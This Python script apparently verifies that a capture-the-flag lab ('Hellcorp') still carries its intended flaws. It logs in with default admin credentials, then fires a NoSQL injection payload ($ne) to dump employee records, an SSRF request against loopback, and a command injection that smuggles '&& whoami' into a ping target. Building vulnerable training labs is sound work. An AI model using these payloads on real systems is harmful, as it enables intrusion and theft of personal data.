import requests
import json
import sys

# Configuration
BASE_URL = "http://localhost:5000"
TOKEN = None # Will be set after login

def log(msg, status="info"):
    colors = {"info": "\033[94m[*]\033[0m", "success": "\033[92m[+]\033[0m", "fail": "\033[91m[-]\033[0m", "warn": "\033[93m[!]\033[0m"}
    print(f"{colors.get(status, '')} {msg}")

def check_login():
    global TOKEN
    log("Checking Authentication endpoint...")
    payload = {"username": "admin", "password": "password123"}
    try:
        r = requests.post(f"{BASE_URL}/api/auth/login", json=payload)
        if r.status_code == 200:
            TOKEN = r.json().get("sessionToken")
            log("Login successful. Token acquired.", "success")
            return True
        else:
            log(f"Login failed: {r.status_code}", "fail")
            return False
    except Exception as e:
        log(f"Connection failed: {e}", "fail")
        return False

def check_nosql_injection():
    log("Checking NoSQL Injection in HR search...")
    # Using 'q' as an object to return all users
    payload = {"q": {"$ne": "null"}} 
    headers = {"Authorization": f"Bearer {TOKEN}"}
    try:
        r = requests.get(f"{BASE_URL}/api/hr/employees", params=payload, headers=headers)
        if r.status_code == 200:
            records = r.json().get("records", [])
            if len(records) > 5:
                log(f"NoSQL Injection successful. Retrieved {len(records)} records using $ne payload.", "success")
                return True
        log("NoSQL Injection check failed.", "fail")
        return False
    except Exception as e:
        log(f"NoSQL test failed: {e}", "fail")
        return False

def check_ssrf():
    log("Checking SSRF in Infrastructure monitor...")
    # Attempting to fetch internal loopback (simulating SSRF)
    params = {"node": "localhost:5000", "service": "api/auth/me"}
    headers = {"Authorization": f"Bearer {TOKEN}"}
    try:
        r = requests.get(f"{BASE_URL}/api/infrastructure/health", params=params, headers=headers)
        if r.status_code == 200 and "identity" in r.text:
            log("SSRF vulnerability verified.", "success")
            return True
        log("SSRF check failed.", "fail")
        return False
    except Exception as e:
        log(f"SSRF test failed: {e}", "fail")
        return False

def check_command_injection():
    log("Checking Command Injection in Diagnostics...")
    payload = {"target": "127.0.0.1 && whoami", "type": "ping"}
    headers = {"Authorization": f"Bearer {TOKEN}"}
    try:
        r = requests.post(f"{BASE_URL}/api/infrastructure/diagnostic", json=payload, headers=headers)
        if r.status_code == 200 and "output" in r.json():
            log(f"Command Injection potential verified. Output: {r.json()['output'].strip()}", "success")
            return True
        log("Command Injection check failed.", "fail")
        return False
    except Exception as e:
        log(f"Command injection test failed: {e}", "fail")
        return False

def main():
    print("\n" + "="*50)
    print(" HELLCORP GLOBAL ENTERPRISE - CTF HEALTHCHECK")
    print("="*50 + "\n")
    
    if not check_login():
        log("Terminating healthcheck: Auth required for further tests.", "fail")
        sys.exit(1)
        
    results = [
        check_nosql_injection(),
        check_ssrf(),
        check_command_injection()
    ]
    
    print("\n" + "="*50)
    if all(results):
        log("ALL CORE VULNERABILITIES VERIFIED. Lab is ready.", "success")
    else:
        log("Some vulnerabilities failed verification. Manual audit required.", "warn")
    print("="*50 + "\n")

if __name__ == "__main__":
    main()
